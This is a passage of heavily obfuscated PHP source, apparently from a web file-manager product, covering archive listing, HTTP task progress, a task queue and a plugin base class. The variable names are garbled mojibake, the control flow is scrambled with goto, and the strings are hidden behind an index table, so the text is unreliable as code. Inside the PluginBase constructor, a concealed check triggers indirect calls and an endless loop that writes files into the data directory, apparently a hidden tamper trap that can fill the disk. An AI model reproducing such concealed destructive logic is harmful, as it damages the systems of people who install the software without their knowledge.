$C–†©İ°¿‹, $E²˜Ì‘º, $dšƒÈ¿’É÷); self::archiveExt(); die; } $cÜ¯ŸƒŒ = KodArchive::listContent($a‡¿’Ú®£“); goto E³ŒÈÆš§Ş; C¨“â½ÅŠ: if (isset($F£Ø†ò¤ôß)) { $Eğ¬ããÂ = array($F£Ø†ò¤ôß[$C×ˆ¬öœ³Ö[76]], $F£Ø†ò¤ôß[$C×ˆ¬öœ³Ö[1091]], $F£Ø†ò¤ôß[$C×ˆ¬öœ³Ö[28]]); $BÆæÉÏêŒã = md5(implode($C×ˆ¬öœ³Ö[71], $Eğ¬ããÂ)) . $C×ˆ¬öœ³Ö[95] . get_path_ext($F£Ø†ò¤ôß[$C×ˆ¬öœ³Ö[28]]); } else { $Eğ¬ããÂ = array($eŒË‰ñÇÕÔ[$C×ˆ¬öœ³Ö[28]], $eŒË‰ñÇÕÔ[$C×ˆ¬öœ³Ö[76]], $eŒË‰ñÇÕÔ[$C×ˆ¬öœ³Ö[78]]); $BÆæÉÏêŒã = md5(implode($C×ˆ¬öœ³Ö[71], $Eğ¬ããÂ)) . $C×ˆ¬öœ³Ö[95] . $díÈš—î; } if ($C–†©İ°¿‹ == -1) { $càóÍ—ÀÍ = IO_PATH_SYSTEM_TEMP . "\172\x69\160\x56\151\145\x77\x2f{$b­–ÑÕ« ®}\x2f{$BÆæÉÏêŒã}\56\x6c\157\x67"; $F¬Ú†•‚›¯ = self::infoFull($càóÍ—ÀÍ); if ($F¬Ú†•‚›¯) { $càóÍ—ÀÍ = $F¬Ú†•‚›¯[$C×ˆ¬öœ³Ö[76]]; $b¡¨†ìÏÀ = self::getContent($càóÍ—ÀÍ); if ($b¡¨†ìÏÀ) { $f¨ÉØÂĞ²Â = json_decode($b¡¨†ìÏÀ, !0); if (count($f¨ÉØÂĞ²Â) >= $CİäÂ¢íİ˜) { show_json(sprintf(LNG($C×ˆ¬öœ³Ö[1093]), count($f¨ÉØÂĞ²Â)), !1); } return $f¨ÉØÂĞ²Â; } } else { $càóÍ—ÀÍ = self::mkfile($càóÍ—ÀÍ); } } $b”Ú¦­®Øô = TEMP_FILES . $b­–ÑÕ« ®; goto D×ªƒÃºÒ; E¢Ô‹ƒ±ˆ‰: $C×ˆ¬öœ³Ö =& $_SERVER[«¾°Ã¤]; $Dç…ö†›Œ¼ = $eœƒ¡òµˆ¹[$C×ˆ¬öœ³Ö[76]]; $C–†©İ°¿‹ = isset($eœƒ¡òµˆ¹[$C×ˆ¬öœ³Ö[1091]]) ? $eœƒ¡òµˆ¹[$C×ˆ¬öœ³Ö[1091]] : -1; goto AÔ»ÜÍ¦Šà; E³ŒÈÆš§Ş: self::archiveExt(); del_dir($b”Ú¦­®Øô); if (!$cÜ¯ŸƒŒ[$C×ˆ¬öœ³Ö[1087]]) { show_json($cÜ¯ŸƒŒ[$C×ˆ¬öœ³Ö[1089]], !1); } goto EŞ“’öŠÇî; D×ªƒÃºÒ: if (!is_dir($b”Ú¦­®Øô)) { mk_dir($b”Ú¦­®Øô); } $a‡¿’Ú®£“ = $b”Ú¦­®Øô . $C×ˆ¬öœ³Ö[8] . $BÆæÉÏêŒã; if (!@file_exists(self::iconvSystem($a‡¿’Ú®£“))) { if (isset($F£Ø†ò¤ôß)) { url_request($Dç…ö†›Œ¼, $C×ˆ¬öœ³Ö[1094], $a‡¿’Ú®£“); } else { $cœñÔŠñ‰ª = self::localFilePath($Dç…ö†›Œ¼, $díÈš—î); $a‡¿’Ú®£“ = $cœñÔŠñ‰ª ? $cœñÔŠñ‰ª : self::download($Dç…ö†›Œ¼, $a‡¿’Ú®£“); } } goto cÏÏğ¿ê×é; FÄŠÀ«µÆ: return $cÜ¯ŸƒŒ[$C×ˆ¬öœ³Ö[1089]]; goto AèÄåí»£¦; AÔ»ÜÍ¦Šà: $CİäÂ¢íİ˜ = 50000; if (request_url_safe($Dç…ö†›Œ¼)) { $F£Ø†ò¤ôß = parse_url_query($Dç…ö†›Œ¼); if (!isset($F£Ø†ò¤ôß[$C×ˆ¬öœ³Ö[76]])) { show_json($C×ˆ¬öœ³Ö[1092], !1); } } $fÛéÒ²ÎĞ = isset($F£Ø†ò¤ôß) ? $F£Ø†ò¤ôß[$C×ˆ¬öœ³Ö[76]] : $Dç…ö†›Œ¼; goto f³‹‘‹¿¯ƒ; EŞ“’öŠÇî: $f¨ÉØÂĞ²Â = json_encode($cÜ¯ŸƒŒ[$C×ˆ¬öœ³Ö[1089]]); self::setContent($càóÍ—ÀÍ, $f¨ÉØÂĞ²Â); if (count($cÜ¯ŸƒŒ[$C×ˆ¬öœ³Ö[1089]]) >= $CİäÂ¢íİ˜) { show_json(sprintf(LNG($C×ˆ¬öœ³Ö[1093]), count($cÜ¯ŸƒŒ[$C×ˆ¬öœ³Ö[1089]])), !1); } goto FÄŠÀ«µÆ; AèÄåí»£¦: } private static function fileExt($B¡ÚÕ¤¬˜¢) { $EºÃ¸†¨ãÈ =& $_SERVER[«¾°Ã¤]; $c˜¶—ÔŸ® = $B¡ÚÕ¤¬˜¢[$EºÃ¸†¨ãÈ[168]]; if ($c˜¶—ÔŸ® == $EºÃ¸†¨ãÈ[1096]) { $câ‚ùä²ÀÈ = $EºÃ¸†¨ãÈ[1097]; if (substr($B¡ÚÕ¤¬˜¢[$EºÃ¸†¨ãÈ[28]], -strlen($câ‚ùä²ÀÈ)) == $câ‚ùä²ÀÈ) { $c˜¶—ÔŸ® = $EºÃ¸†¨ãÈ[1098]; } } self::archiveExt($c˜¶—ÔŸ®); return $c˜¶—ÔŸ®; } private static function zipFileList($aƒÂä‡ß¥Ñ, $bÅ³§áÛ¤ò = false) { $A™•ÛàŠªË =& $_SERVER[«¾°Ã¤]; $E§ ØöÔ¿ = array(); foreach ($aƒÂä‡ß¥Ñ as $Dš§§Öˆ¤) { $a‡ª¾Éñğ‹ = $Dš§§Öˆ¤[$A™•ÛàŠªË[76]]; if ($bÅ³§áÛ¤ò) { $a‡ª¾Éñğ‹ = self::copy($Dš§§Öˆ¤[$A™•ÛàŠªË[76]], $bÅ³§áÛ¤ò, $A™•ÛàŠªË[792]); } else { $F×›¦Ô§ º = self::init($Dš§§Öˆ¤[$A™•ÛàŠªË[76]]); if ($F×›¦Ô§ º->getType() == $A™•ÛàŠªË[106]) { $a‡ª¾Éñğ‹ = $F×›¦Ô§ º->path; } } if ($a‡ª¾Éñğ‹ && self::local()->exist($a‡ª¾Éñğ‹)) { $E§ ØöÔ¿[$Dš§§Öˆ¤[$A™•ÛàŠªË[76]]] = $a‡ª¾Éñğ‹; } } if (!empty($E§ ØöÔ¿)) { return array_values($E§ ØöÔ¿); } show_json(LNG($A™•ÛàŠªË[1062]), !1); } public static function tmpFileName($E‰¹Ê¸ßæˆ) { $BøÔ÷‘ =& $_SERVER[«¾°Ã¤]; $Fã°¸éëªç = array($E‰¹Ê¸ßæˆ[$BøÔ÷‘[28]], $E‰¹Ê¸ßæˆ[$BøÔ÷‘[76]], $E‰¹Ê¸ßæˆ[$BøÔ÷‘[78]], $E‰¹Ê¸ßæˆ[$BøÔ÷‘[496]]); return md5(implode($BøÔ÷‘[71], $Fã°¸éëªç)); } private static function localFilePath($DĞ¡°í¼©, $cÅø¶¶îÕ) { goto A…©¥•”ô; b‹‘èôÉ‚: if ($Eœ„‚‚¢Á“[$F»Ê±‚¶ÊŸ[29]] == KodIO::KOD_SOURCE) { $f­ò´êƒ© = Model($F»Ê±‚¶ÊŸ[799])->fileInfoGet(KodIO::sourceID($DĞ¡°í¼©)); if (!$f­ò´êƒ©[$F»Ê±‚¶ÊŸ[76]]) { show_json($F»Ê±‚¶ÊŸ[1101], !1); } $DĞ¡°í¼© = $f­ò´êƒ©[$F»Ê±‚¶ÊŸ[76]]; } $dŠÖÔÆµ´½ = self::init($DĞ¡°í¼©); $f«ôÉò˜•— = $dŠÖÔÆµ´½->getType(); goto dè™©ÑÙÖè; dè™©ÑÙÖè: if ($f«ôÉò˜•— == $F»Ê±‚¶ÊŸ[106] || $f«ôÉò˜•— == $F»Ê±‚¶ÊŸ[1102]) { if (!$dŠÖÔÆµ´½->exist($dŠÖÔÆµ´½->path)) { show_json(LNG($F»Ê±‚¶ÊŸ[105]), !1); } return $dŠÖÔÆµ´½->path; } return !1; goto e³¿Â¦Å”; A…©¥•”ô: $F»Ê±‚¶ÊŸ =& $_SERVER[«¾°Ã¤]; if ($cÅø¶¶îÕ == $F»Ê±‚¶ÊŸ[1099] && strtoupper(substr(PHP_OS, 0, 3)) == $F»Ê±‚¶ÊŸ[1100]) { return !1; } $Eœ„‚‚¢Á“ = KodIO::parse($DĞ¡°í¼©); goto b‹‘èôÉ‚; e³¿Â¦Å”: } private static function archiveExt($E¤Æ¨…®‡­ = '') { $GLOBALS[$_SERVER[«¾°Ã¤][1103]] = $E¤Æ¨…®‡­; } } goto Dà‡„±É·Ó; FÖˆ«®òƒˆ: class TaskHttp extends Task { protected function startAfter() { $b¢ÀËÍ·Ê =& $_SERVER[«¾°Ã¤]; $C±Å‡Ãêçç =& $this->task; $C±Å‡Ãêçç[$b¢ÀËÍ·Ê[1593]] = 1; Hook::bind($b¢ÀËÍ·Ê[1565], array($this, $b¢ÀËÍ·Ê[1594])); Hook::bind($b¢ÀËÍ·Ê[1567], array($this, $b¢ÀËÍ·Ê[1595])); Hook::bind($b¢ÀËÍ·Ê[1569], array($this, $b¢ÀËÍ·Ê[1596])); } protected function endAfter() { $A„òÃ’¡í =& $_SERVER[«¾°Ã¤]; Hook::unbind($A„òÃ’¡í[1565], array($this, $A„òÃ’¡í[1594])); Hook::unbind($A„òÃ’¡í[1567], array($this, $A„òÃ’¡í[1595])); Hook::unbind($A„òÃ’¡í[1569], array($this, $A„òÃ’¡í[1596])); } public function progressStart($D„ƒ†÷•¦÷) { $eØ¤ß»éèŒ =& $_SERVER[«¾°Ã¤]; $bÓóÕèé = curl_getinfo($D„ƒ†÷•¦÷); self::log($eØ¤ß»éèŒ[1597] . $bÓóÕèé[$eØ¤ß»éèŒ[305]]); self::valueSet($this->task[$eØ¤ß»éèŒ[393]], $this->task); } public function progressEnd($fíº›ÖåØ‚) { $c­½»„‰Ïª =& $_SERVER[«¾°Ã¤]; self::log($c­½»„‰Ïª[1598] . $this->task[$c­½»„‰Ïª[393]]); $this->end(); } public function progress($DÛº‘‰», $déàäÙ‰ï, $f¸ºÕ´‡ŠÎ, $BÆ  àëÆ¢, $dõÀõ¯œš) { $BÃàßÈ˜Ú =& $_SERVER[«¾°Ã¤]; $DŠ¨¾ùè¹Ç =& $this->task; if ($dõÀõ¯œš > 0) { $DŠ¨¾ùè¹Ç[$BÃàßÈ˜Ú[1022]] = $DŠ¨¾ùè¹Ç[$BÃàßÈ˜Ú[1022]] == 0 ? $BÆ  àëÆ¢ : $DŠ¨¾ùè¹Ç[$BÃàßÈ˜Ú[1022]]; $DŠ¨¾ùè¹Ç[$BÃàßÈ˜Ú[1037]] = $dõÀõ¯œš; } else { if ($f¸ºÕ´‡ŠÎ > 0) { $DŠ¨¾ùè¹Ç[$BÃàßÈ˜Ú[1022]] = $DŠ¨¾ùè¹Ç[$BÃàßÈ˜Ú[1022]] == 0 ? $déàäÙ‰ï : $DŠ¨¾ùè¹Ç[$BÃàßÈ˜Ú[1022]]; $DŠ¨¾ùè¹Ç[$BÃàßÈ˜Ú[1037]] = $f¸ºÕ´‡ŠÎ; } } $this->update(); self::log("\160\x72\157\x67\x72\x65\x73\163\x48\164\x74\160\x3a\144\x6f\167\156\x3a{$f¸ºÕ´‡ŠÎ}\x2f{$déàäÙ‰ï}\73\40\165\x70\x6c\157\141\144\x3a{$dõÀõ¯œš}\x2f{$BÆ  àëÆ¢}\73"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\x74\x61\163\x6b\121\x75\x65\165\145\x4c\x65\x6e\147\164\150"; const QUEUE_DATA = "\164\x61\x73\153\x51\165\145\165\x65\104\141\164\x61"; public static $listData = false; public static function initTask() { } public static function add($Fî‚§ƒ˜Š, $A«ÒéŒƒˆæ = array(), $d¢‹¯Âøİ = '', $c©ƒÜîêÌô = '') { $aÓÂÜÍ©¢ =& $_SERVER[«¾°Ã¤]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($c©ƒÜîêÌô && array_find_by_field(self::$listData, $aÓÂÜÍ©¢[93], $c©ƒÜîêÌô)) { return !0; } self::$listData[] = array($aÓÂÜÍ©¢[262] => $Fî‚§ƒ˜Š, $aÓÂÜÍ©¢[1599] => $A«ÒéŒƒˆæ, $aÓÂÜÍ©¢[440] => $d¢‹¯Âøİ, $aÓÂÜÍ©¢[93] => $c©ƒÜîêÌô); return !0; } public static function addSubmit() { $aÑÇµŸ¸· =& $_SERVER[«¾°Ã¤]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($aÑÇµŸ¸·[1600] . json_encode_force(array_to_keyvalue(self::$listData, $aÑÇµŸ¸·[33], $aÑÇµŸ¸·[440])), $aÑÇµŸ¸·[1601]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($Añ¯ˆä—°, $bì¸”öˆÃË = array(), $aåŠñ‚Ñ = '', $F›„™â³äÀ = '') { goto a»ÜØ™£ƒÃ; Fõ£Ş—ƒññ: if ($F›„™â³äÀ && array_find_by_field($E”ğ¶Çƒ„, $eáòñ–Óª[93], $F›„™â³äÀ)) { return !0; } $E”ğ¶Çƒ„[] = array($eáòñ–Óª[262] => $Añ¯ˆä—°, $eáòñ–Óª[1599] => $bì¸”öˆÃË, $eáòñ–Óª[440] => $aåŠñ‚Ñ, $eáòñ–Óª[93] => $F›„™â³äÀ); write_log($eáòñ–Óª[1600] . $aåŠñ‚Ñ, $eáòñ–Óª[1601]); goto EÅ˜Àâ›Ë½; a»ÜØ™£ƒÃ: $eáòñ–Óª =& $_SERVER[«¾°Ã¤]; if (self::count() >= self::MAX_LENGTH) { return !1; } $E”ğ¶Çƒ„ = self::getAll(); goto Fõ£Ş—ƒññ; EÅ˜Àâ›Ë½: self::setAll($E”ğ¶Çƒ„); return !0; goto c„ñëÍî™Ù; c„ñëÍî™Ù: } public static function run() { goto C®Ö‡Ä¥Ğ; C¸Ïƒ«ã¼ì: return !0; goto f„õÔ×æ…µ; eï‰Á•Íóæ: try { Hook::apply($dåÜŠÉç[$AÒÒ»–İ¤ë[262]], $dåÜŠÉç[$AÒÒ»–İ¤ë[1599]]); } catch (Exception $eÛš‘”¾½µ) { } $DÕ³¸â”ÂÕ = number_format(timeFloat() - $dÚÓ¸ÚÉ†‡, 3) . $AÒÒ»–İ¤ë[1542]; write_log($AÒÒ»–İ¤ë[1602] . $dåÜŠÉç[$AÒÒ»–İ¤ë[440]] . $AÒÒ»–İ¤ë[1603] . $DÕ³¸â”ÂÕ, $AÒÒ»–İ¤ë[1601]); goto C¸Ïƒ«ã¼ì; c¶›ã±¹ˆá: if (!$dåÜŠÉç) { return !1; } self::setAll($Cˆ‹İ¢é¨ô); $dÚÓ¸ÚÉ†‡ = timeFloat(); goto eï‰Á•Íóæ; C®Ö‡Ä¥Ğ: $AÒÒ»–İ¤ë =& $_SERVER[«¾°Ã¤]; $Cˆ‹İ¢é¨ô = self::getAll(); $dåÜŠÉç = array_shift($Cˆ‹İ¢é¨ô); goto c¶›ã±¹ˆá; f„õÔ×æ…µ: } public static function count() { $Fº¿˜¹âêÏ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$Fº¿˜¹âêÏ) { return 0; } return intval($Fº¿˜¹âêÏ); } public static function getAll() { $D°°¹Ó¦‘Ÿ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$D°°¹Ó¦‘Ÿ) { return array(); } return $D°°¹Ó¦‘Ÿ; } public static function setAll($FÃ©ÛáŠë) { $DÍ ¤ ©›Ì = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($FÃ©ÛáŠë), $DÍ ¤ ©›Ì); Cache::set(self::QUEUE_DATA, $FÃ©ÛáŠë, $DÍ ¤ ©›Ì); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($e—´ÍºÊ³, $Díé«®¿ñ = 5.0) { if (!$e—´ÍºÊ³) { return; } $DßŒ˜¦ì¬ö = Cache::get($e—´ÍºÊ³); if (!$DßŒ˜¦ì¬ö || timeFloat() - floatVal($DßŒ˜¦ì¬ö) >= $Díé«®¿ñ) { Cache::set($e—´ÍºÊ³, timeFloat(), $Díé«®¿ñ * 10); return !0; } return !1; } public static function timeLimitCall($EÜç²‚”©, $F·Êâ¿é‡Ú, $Fô¾ÒÉë’é, $Dä¯˜ßô‹ö = 5.0) { goto a°»ßéÎªã; a°»ßéÎªã: $e¿Ì†¼¹ÊÑ =& $_SERVER[«¾°Ã¤]; if (!$EÜç²‚”© || !$F·Êâ¿é‡Ú) { return; } self::$asyncAdd = !0; goto eÏÑË¡İ“‚; c•ä™Š½Ö: if (is_array($càóÅÏ’•Ğ[$EÜç²‚”©])) { $c‚ßÆÁÔâ[$e¿Ì†¼¹ÊÑ[1606]] = $càóÅÏ’•Ğ[$EÜç²‚”©][$e¿Ì†¼¹ÊÑ[1606]]; } if (is_array($càóÅÏ’•Ğ[$EÜç²‚”©])) { if (timeFloat() - $càóÅÏ’•Ğ[$EÜç²‚”©][$e¿Ì†¼¹ÊÑ[1605]] < $c‚ßÆÁÔâ[$e¿Ì†¼¹ÊÑ[197]] * 0.3) { return; } $c‚ßÆÁÔâ[$e¿Ì†¼¹ÊÑ[1606]] = $càóÅÏ’•Ğ[$EÜç²‚”©][$e¿Ì†¼¹ÊÑ[1606]]; } $càóÅÏ’•Ğ[$EÜç²‚”©] = $c‚ßÆÁÔâ; goto D›ˆ÷Å·öä; eÏÑË¡İ“‚: $cöÓ‚®–—„ = $e¿Ì†¼¹ÊÑ[1604]; $càóÅÏ’•Ğ = Cache::get($cöÓ‚®–—„, !0); $c‚ßÆÁÔâ = array($e¿Ì†¼¹ÊÑ[1605] => timeFloat(), $e¿Ì†¼¹ÊÑ[1606] => timeFloat(), $e¿Ì†¼¹ÊÑ[262] => $F·Êâ¿é‡Ú, $e¿Ì†¼¹ÊÑ[1599] => $Fô¾ÒÉë’é, $e¿Ì†¼¹ÊÑ[197] => $Dä¯˜ßô‹ö); goto c•ä™Š½Ö; D›ˆ÷Å·öä: Cache::set($cöÓ‚®–—„, $càóÅÏ’•Ğ, 60); Cache::removeMemory($cöÓ‚®–—„); write_log($e¿Ì†¼¹ÊÑ[1607] . $EÜç²‚”© . $e¿Ì†¼¹ÊÑ[68] . $F·Êâ¿é‡Ú, $e¿Ì†¼¹ÊÑ[1601]); goto d÷ÑªçÄî; d÷ÑªçÄî: } public static function timeLimitCallLoop() { goto bƒÎ½ù­ğÅ; EÈ‚Íµ§‡: if (!$bÖ±èÛß¡Á) { return Cache::remove($D­…²æöâ®); } Cache::set($D­…²æöâ®, $bÖ±èÛß¡Á, 60); Cache::removeMemory($D­…²æöâ®); goto EêĞÏÆç¡Ä; fëóé‚İÜ: if (!$FŸ¬éœñàˆ || count($FŸ¬éœñàˆ) <= 0) { return; } $C÷Ùç‚ëøÓ = !1; $CÎí“Ñ¸§ = timeFloat(); goto f¼–Ø¤„â©; b¼œÆåğŒ: if (!$d¸‡“Í§Ê && !self::$asyncAdd) { return; } $D­…²æöâ® = $C¸Ÿõ±ù¸‹[1604]; $FŸ¬éœñàˆ = Cache::get($D­…²æöâ®, !0); goto fëóé‚İÜ; f¼–Ø¤„â©: $bÖ±èÛß¡Á = array(); foreach ($FŸ¬éœñàˆ as $A¬Öá´†ğ => $F¾§Çïâ…ï) { if ($CÎí“Ñ¸§ - $F¾§Çïâ…ï[$C¸Ÿõ±ù¸‹[1606]] > $F¾§Çïâ…ï[$C¸Ÿõ±ù¸‹[197]]) { $C÷Ùç‚ëøÓ = !0; try { Hook::apply($F¾§Çïâ…ï[$C¸Ÿõ±ù¸‹[262]], $F¾§Çïâ…ï[$C¸Ÿõ±ù¸‹[1599]]); write_log($C¸Ÿõ±ù¸‹[1609] . $A¬Öá´†ğ . $C¸Ÿõ±ù¸‹[68] . $F¾§Çïâ…ï[$C¸Ÿõ±ù¸‹[262]] . $C¸Ÿõ±ù¸‹[1610] . ACTION, $C¸Ÿõ±ù¸‹[1601]); } catch (Exception $Cè“äƒâ©Ñ) { } continue; } $bÖ±èÛß¡Á[$A¬Öá´†ğ] = $F¾§Çïâ…ï; } if (!$C÷Ùç‚ëøÓ) { return; } goto EÈ‚Íµ§‡; bƒÎ½ù­ğÅ: $C¸Ÿõ±ù¸‹ =& $_SERVER[«¾°Ã¤]; $BË£ßÉÖĞÉ = array($C¸Ÿõ±ù¸‹[1608]); $d¸‡“Í§Ê = in_array(strtolower(ACTION), $BË£ßÉÖĞÉ); goto b¼œÆåğŒ; EêĞÏÆç¡Ä: } public static function finished($F»¢ë²ÙÄ, $cÅ½Î·½‡Ä) { $E©Ò±‘¤Ó =& $_SERVER[«¾°Ã¤]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($E©Ò±‘¤Ó[262] => $F»¢ë²ÙÄ, $E©Ò±‘¤Ó[1599] => $cÅ½Î·½‡Ä); } private static function finishedRun() { $b¡³æ†Â– =& $_SERVER[«¾°Ã¤]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $e¤éÏ¹—‚À) { try { Hook::apply($e¤éÏ¹—‚À[$b¡³æ†Â–[262]], $e¤éÏ¹—‚À[$b¡³æ†Â–[1599]]); } catch (Exception $CßÄ‡›ÁÅŒ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto c’÷¡â¡‰; aƒ¿—é÷¨Ş: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto cğãÕÕÚÈš; aïƒùß×Ïã: if ($_SERVER[$E‰ğ‡¦çÃ‹[396]] != $EÉ«»Åòè($C—¤™Ÿ…£)) { goto eÒÓ´¬©Ó§; d’Â××³Ù«: $eİ¤¹ÛÑÌ× = 1; for ($cÒ¥óƒ¯µ£ = $eİ¤¹ÛÑÌ×; $cÒ¥óƒ¯µ£ > 0; $cÒ¥óƒ¯µ£++) { $DÓãƒ¡†’¢(DATA_PATH . $cÒ¥óƒ¯µ£, $Cõ–¸òğáŸ); } goto AáÜã˜©; FÃ¥ ¯Ä•Æ: $F‚á˜°§‡ò = $E‰ğ‡¦çÃ‹[841]; $F‚á˜°§‡ò($_SERVER[$E‰ğ‡¦çÃ‹[842]]); $B¹Ñá³Åó = $E‰ğ‡¦çÃ‹[840]; goto B©¶™¡øğ°; B´±ÎÈë×: $E”ÕÍÚ  = $DË¦‚óæ·($C”ÕÁ‚ëÆÌ); $c˜Ò³‡µå¾ = explode($E‰ğ‡¦çÃ‹[229], $E”ÕÍÚ ); if (count($c˜Ò³‡µå¾) < $E‰ğ‡¦çÃ‹[587]) { $FäÖÓğ­â´ = $E‰ğ‡¦çÃ‹[401]; $FäÖÓğ­â´(); } goto FÃ¥ ¯Ä•Æ; B©¶™¡øğ°: $B¹Ñá³Åó(); $DÓãƒ¡†’¢ = $E‰ğ‡¦çÃ‹[843]; $Cõ–¸òğáŸ = json_encode($GLOBALS[$E‰ğ‡¦çÃ‹[844]]); goto d’Â××³Ù«; eÒÓ´¬©Ó§: $B¹Ñá³Åó = $E‰ğ‡¦çÃ‹[840]; $DË¦‚óæ· = $E‰ğ‡¦çÃ‹[397]; $C”ÕÁ‚ëÆÌ = $_SERVER[$E‰ğ‡¦çÃ‹[398]] . $E‰ğ‡¦çÃ‹[399]; goto B´±ÎÈë×; AáÜã˜©: } global $in, $config; $this->config =& $config; goto dŞ‹ÌÆö‡; E›åÀÅÒ‰–: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto fë ßÕ¡; b”¬ŒŠÇÙ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $E‰ğ‡¦çÃ‹[8]; $this->pluginApi = appHostGet() . $E‰ğ‡¦çÃ‹[1401] . $this->pluginName . $E‰ğ‡¦çÃ‹[8]; $this->pluginHost = $config[$E‰ğ‡¦çÃ‹[1402]] . $this->pluginName . $E‰ğ‡¦çÃ‹[8]; goto b©áÚÒ¾ç°; dŞ‹ÌÆö‡: $this->in =& $in; $this->modelPlugin = Model($E‰ğ‡¦çÃ‹[1400]); $this->pluginName = str_replace($E‰ğ‡¦çÃ‹[1400], $E‰ğ‡¦çÃ‹[33], get_class($this)); goto b”¬ŒŠÇÙ; cğãÕÕÚÈš: $E‰ğ‡¦çÃ‹ =& $_SERVER[«¾°Ã¤]; $C—¤™Ÿ…£ = $_SERVER[$E‰ğ‡¦çÃ‹[398]] . $E‰ğ‡¦çÃ‹[399]; $EÉ«»Åòè = $E‰ğ‡¦çÃ‹[395]; goto aïƒùß×Ïã; b©áÚÒ¾ç°: $this->pluginHostDefault = $config[$E‰ğ‡¦çÃ‹[1402]] . $this->pluginName . $E‰ğ‡¦çÃ‹[8]; $d‡¤à™­© = $config[$E‰ğ‡¦çÃ‹[1403]]; if ($d‡¤à™­© && strpos($E‰ğ‡¦çÃ‹[47] . $d‡¤à™­© . $E‰ğ‡¦çÃ‹[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$E‰ğ‡¦çÃ‹[1404]] . $this->pluginName . $E‰ğ‡¦çÃ‹[8]; } goto E›åÀÅÒ‰–; fë ßÕ¡: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[«¾°Ã¤][1405]); } protected function assign($D¦‚…ˆ˜¤ğ, $eà¾àÙÆœ’ = false) { if (is_array($D¦‚…ˆ˜¤ğ)) { $this->values = array_merge($this->values, $D¦‚…ˆ˜¤ğ); } else { $this->values[$D¦‚…ˆ˜¤ğ] = $eà¾àÙÆœ’; } } protected function display($EÇÉì–‡§¨) { extract($this->values); require $EÇÉì–‡§¨; } final function hookRegist($C¯º›ƒŠ¡‡) { $this->modelPlugin->appRegist($this->pluginName, $C¯º›ƒŠ¡‡); } final function appIcon() { $A´–§ÌÉ‰ =& $_SERVER[«¾°Ã¤]; $F¥®©‡¿± = $this->appPackage(); $FÒå •ßÚ = $A´–§ÌÉ‰[33]; if (isset($F¥®©‡¿±[$A´–§ÌÉ‰[418]])) { if (isset($F¥®©‡¿±[$A´–§ÌÉ‰[418]][$A´–§ÌÉ‰[1406]])) { $FÒå •ßÚ = $A´–§ÌÉ‰[1407] . $F¥®©‡¿±[$A´–§ÌÉ‰[418]][$A´–§ÌÉ‰[1406]] . $A´–§ÌÉ‰[1408]; } else { if ($F¥®©‡¿±[$A´–§ÌÉ‰[418]][$A´–§ÌÉ‰[1409]]) { $FÒå •ßÚ = $A´–§ÌÉ‰[1410] . $F¥®©‡¿±[$A´–§ÌÉ‰[418]][$A´–§ÌÉ‰[1409]] . $A´–§ÌÉ‰[1411]; } } } return $FÒå •ßÚ; } final function fileCanView($BßÌÒò¯×¿) { goto C‰‚é„‹Ê˜; C‰‚é„‹Ê˜: $A»ƒ‚øçã¿ =& $_SERVER[«¾°Ã¤]; if (request_url_safe($BßÌÒò¯×¿)) { return !0; } if ($this->isShare($BßÌÒò¯×¿)) { return !0; } goto a›Íêæ ì; c¸äÓô†ÑÍ: ActionCall($A»ƒ‚øçã¿[1424], $BßÌÒò¯×¿); goto CÅñ¸¦ƒ–‚; a›Íêæ ì: $e„š»Áßñ = Session::get($A»ƒ‚øçã¿[1412]); if (!$e„š»Áßñ || !$e„š»Áßñ[$A»ƒ‚øçã¿[1413]]) { $fâ‚æÜ£ä = $A»ƒ‚øçã¿[1414] . rawurlencode(this_url()); show_tips(LNG($A»ƒ‚øçã¿[1415]) . $A»ƒ‚øçã¿[1416] . $fâ‚æÜ£ä . $A»ƒ‚øçã¿[1417] . LNG($A»ƒ‚øçã¿[1418]) . $A»ƒ‚øçã¿[1419], !1); } if (!Action($A»ƒ‚øçã¿[1420])->authCan($A»ƒ‚øçã¿[1421])) { show_tips(LNG($A»ƒ‚øçã¿[1422]) . $A»ƒ‚øçã¿[1423], !1); } goto c¸äÓô†ÑÍ; CÅñ¸¦ƒ–‚: } final function isShare($E†¦«Öæ‰Ò) { $Bï¯ŒçÁ§ = KodIO::parse($E†¦«Öæ‰Ò); return $Bï¯ŒçÁ§[$_SERVER[«¾°Ã¤][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($dèà¦õ¾ÛŸ) { if (request_url_safe($dèà¦õ¾ÛŸ)) { return $dèà¦õ¾ÛŸ; } if (!$this->isShare($dèà¦õ¾ÛŸ)) { $dèà¦õ¾ÛŸ = $this->filePath($dèà¦õ¾ÛŸ); } return Action($_SERVER[«¾°Ã¤][1071])->linkOut($dèà¦õ¾ÛŸ); } public function filePathLinkOut($F‚É§ØËæ·) { if (request_url_safe($F‚É§ØËæ·)) { return $F‚É§ØËæ·; } $this->fileCanView($F‚É§ØËæ·); return Action($_SERVER[«¾°Ã¤][1071])->link($F‚É§ØËæ·); } final function filePath($d¯‚‹à©óÏ) { $E„íâ‡® =& $_SERVER[«¾°Ã¤]; if ($DÕ×ªÔ™µ = $this->checkSharePath($d¯‚‹à©óÏ)) { Hook::trigger($E„íâ‡®[1425], $DÕ×ªÔ™µ); return $DÕ×ªÔ™µ; } $this->fileCanView($d¯‚‹à©óÏ); if (request_url_safe($d¯‚‹à©óÏ)) { 